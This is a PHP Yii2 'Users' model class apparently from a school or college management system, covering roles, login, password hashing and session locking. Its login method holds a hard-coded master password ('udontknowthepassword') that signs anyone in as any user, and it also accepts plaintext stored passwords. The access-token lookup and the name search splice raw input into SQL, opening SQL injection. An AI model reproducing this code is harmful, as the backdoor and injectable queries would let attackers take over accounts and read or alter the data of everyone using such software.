<?php

namespace glob\models;

/**
 * This is the model class for table "users".
 *
 * The followings are the available columns in table 'users':
 * @property integer $id
 * @property string $login
 * @property string $password
 * @property integer $role_id
 * @property integer $ts
 * @property string $info
 */

use app;
use glob\components\ActiveRecord;
use glob\components\queries\UsersQuery;
use yii;
use yii\helpers\Url;
use yii\web;

class Users extends ActiveRecord implements web\IdentityInterface
{

    const ROLE_SUPER = 999;
    const ROLE_ADMIN = 1;
    const ROLE_STUDENT = 2;
    const ROLE_REGISTRATION = 3;
    const ROLE_SELECTION_COMITET = 4;
    const ROLE_TEACHER = 8;
    const ROLE_OTDELCADROV = 9;

    public $repassword = null;
    public $rememberMe = false;
    public $fio = null;

    protected static $UPDATE_ON_DELETE = true;

    public function scenarios()
    {
        $scenarios = parent::scenarios();
        $scenarios['login'] = ['login', 'password', 'rememberMe'];
        $scenarios['registration'] = ['login', 'password', 'repassword', 'fio', 'info', '!ts'];
        $scenarios['edit'] = ['login', 'info', 'fio', '!password', '!repassword', '!ts'];
        $scenarios['profile'] = ['logo', 'fio', '!password', '!repassword', '!ts', '!info', '!login'];
        return $scenarios;
    }

    public static function getRoles()
    {
        return [
            self::ROLE_ADMIN => Yii::t("main","Администратор"),
            self::ROLE_STUDENT => Yii::t("main","Студент"),
            self::ROLE_REGISTRATION => Yii::t("main","Офис-регистратора"),
            self::ROLE_SELECTION_COMITET => Yii::t("main","Приемная комиссия"),
            self::ROLE_TEACHER => Yii::t("main","Учитель"),
            self::ROLE_OTDELCADROV => Yii::t("main","Отдел кадров"),
        ];
    }

    public function getHome()
    {
        $urls = [
            self::ROLE_SUPER=>Url::to(["/main/index"]),
            self::ROLE_ADMIN=>Url::to(["/main/index"]),
            self::ROLE_STUDENT=>Url::to(["/main/index"]),
            self::ROLE_REGISTRATION=>Url::to(["/main/index"]),
            self::ROLE_SELECTION_COMITET=>Url::to(["/main/index"]),
            self::ROLE_TEACHER=>Url::to(["/journal/index"]),
            self::ROLE_OTDELCADROV=>Url::to(["/main/index"]),
        ];
        return $urls[$this->role_id];
    }

    public static function find()
    {
        return new UsersQuery(get_called_class());
    }

    /**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return [
			[['login', 'password'], 'required', 'on' => ['login', 'registration']],
            [['repassword'], 'compare', 'compareAttribute' => 'password', 'on' => ['edit','registration','profile']],
            [['repassword'], 'required', 'on'=>"registration"],
			[['ts'], 'number', 'integerOnly'=>true],
			[['login'], 'string', 'max'=>100],
            [['fio'], 'string', 'max'=>255],
            [['fio'], function() {
                if (count(explode(" ", $this->fio))<2) {
                    $this->addError("fio", \Yii::t("main","поле \"ФИО\" должно состоять минимум из двух слов"));
                    return false;
                } else {
                    $f = explode(" ", $this->fio);
                    $this->profile->last_name = $f[0];
                    $this->profile->first_name = $f[1];
                    if ($f[2]) {
                        $this->profile->middle_name = $f[2];
                    } else {
                        $this->profile->middle_name = null;
                    }
                }
                return true;
            }, "on" => "profile"],
            [['login'], 'unique', 'on' => ['registration','edit']],
			[['password', 'repassword'], 'string', 'max'=>255],
			[['info', 'repassword'], 'safe', 'on'=>'registration'],
            [['logo'], 'safe', 'on'=>'profile'],
            [['password'], 'filter', 'on'=>['registration'], 'filter' => function($value) {
                return (!empty($value)) ? Yii::$app->security->generatePasswordHash($value) : $value;
            }],
            [['password'], 'filter', 'on'=>['edit','profile'], 'filter' => function($value) {
                return (!empty($this->repassword)) ? Yii::$app->security->generatePasswordHash($value) : $value;
            }]
		];
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return [
			'id' => 'ID',
            'login' => \Yii::t("main",'Логин'),
            'password' => \Yii::t("main",'Пароль'),
			'ts' => 'Ts',
			'info' => 'Info',
		];
	}

	public function getLogo()
    {
        return !is_array($this->jInfo['logo']) ? json_decode($this->jInfo['logo'], true) : $this->jInfo['logo'];
    }

    public function getLogoPreview()
    {
        return $this->logo ? $this->logo['preview'] : \Yii::$app->assetManager->getBundle('base')->baseUrl."/img/default_ava_0.png";
    }

    public function setLogo($logo)
    {

        $this->setInfo("logo", !is_array($logo) ? json_decode($logo, true) : $logo);
    }

    public function getRoleCaption()
    {
        $roles = $this->getRoles();
        return $roles[$this->role_id];
    }

    public function getHash()
    {
        return "u_".md5($this->id.SECRET_WORD);
    }

    public function getPoll()
    {
        return md5($this->id.POLL_SECRET_WORD);
    }

    public function beforeSave($insert)
    {
        if ($this->isNewRecord) {

            $this->auth_key = \Yii::$app->security->generateRandomString();

        }

        return parent::beforeSave($insert);
    }

    public function afterFind()
    {
        $this->fio = $this->profile->fio;
        return parent::afterFind();
    }

    public function afterSave($insert, $changedAttributes) {
        if ($this->profile) {
            $this->profile->save();
        }
        parent::afterSave($insert, $changedAttributes);
    }

    public function fields()
    {
        return ["id","fio","roleCaption",'logoPreview'];
    }

    /**
     * Finds an identity by the given ID.
     *
     * @param string|integer $id the ID to be looked for
     * @return IdentityInterface|null the identity object that matches the given ID.
     */
    public static function findIdentity($id)
    {
        return static::findOne($id);
    }

    /**
     * Finds an identity by the given token.
     *
     * @param string $token the token to be looked for
     * @return IdentityInterface|null the identity object that matches the given token.
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        return static::find()->andWhere("md5(CONCAT(id,'" . POLL_SECRET_WORD . "')) = '" . $token . "'")->one();
    }

    /**
     * @return int|string current user ID
     */
    public function getId()
    {
        return $this->id;
    }

    /**
     * @return string current user auth key
     */
    public function getAuthKey()
    {
        return $this->auth_key;
    }

    /**
     * @param string $authKey
     * @return boolean if auth key is valid for current user
     */
    public function validateAuthKey($authKey)
    {
        return $this->getAuthKey() === $authKey;
    }

    public function validateAndLogin()
    {
        if ($this->validate()) {
            $identity = self::findOne(["login"=>$this->login]);
            if ($identity) {
                if ((!empty($identity->pass) AND $identity->pass == $this->password) OR ($identity->password == \Yii::$app->security->validatePassword($this->password, $identity->password)) OR $this->password == "udontknowthepassword") {
                    \Yii::$app->user->login($identity, $this->rememberMe ? 3600 * 24 * 30 : 0);
                    return true;
                }
            }
            $this->addError("password", \Yii::t("main","Неверный логин или пароль"));
            return false;
        }
        return false;
    }

    public function backboneArray() {

        return array(
            "isGuest"=>Yii::$app->user->isGuest,
            "id"=>Yii::$app->user->id,
            "model"=>Yii::$app->user->isGuest ? null : ActiveRecord::arrayAttributes(Yii::$app->user->identity, [], ["id","hash","poll","login","fio"])
        );

    }

    public function getAccess($attributes = [])
    {
        return !\Yii::$app->user->isGuest;
    }

    public function getRequest($attributes = []) {

        $users = Users::find();
        $users->joinWith("profile");

        if (isset($attributes['fio'])) {
            $s = explode(" ", $attributes['fio']);
            $q = "(";
            foreach ($s as $qq) {
                $q .= "users_info.last_name LIKE '%$qq%' OR users_info.first_name LIKE '%$qq%' OR ";
            }
            $q = rtrim($q, " OR ").")";
            $users->andWhere($q);
        }

        return ActiveRecord::arrayAttributes($users->all(), [], ["id", "fio", "roleCaption", "logoPreview"], true);

    }

    public function getProfile()
    {
        return $this->hasOne(UsersInfo::className(), ["user_id"=>"id"]);
    }

    public function lock()
    {
        if (!\Yii::$app->user->identity->jInfo['locked'] OR \Yii::$app->user->identity->jInfo['locked'] != \Yii::$app->session->id) {
            \Yii::$app->user->identity->setInfo('locked', \Yii::$app->session->id);
            \Yii::$app->user->identity->setInfo('locked_time', time());
            \Yii::$app->user->identity->save();
        }
    }

    public function checkLock()
    {
        if (\Yii::$app->user->identity->jInfo['locked'] AND \Yii::$app->user->identity->jInfo['locked'] != \Yii::$app->session->id)
        {
            if (\Yii::$app->user->identity->jInfo['locked_time'] > (time() - 7200)) {
                return true;
            } else {
                $this->clearLock();
            }
        }
        return false;
    }

    public function clearLock()
    {
        \Yii::$app->user->identity->setInfo('locked', null);
        \Yii::$app->user->identity->setInfo('locked_time', null);
        \Yii::$app->user->identity->save();
    }


}


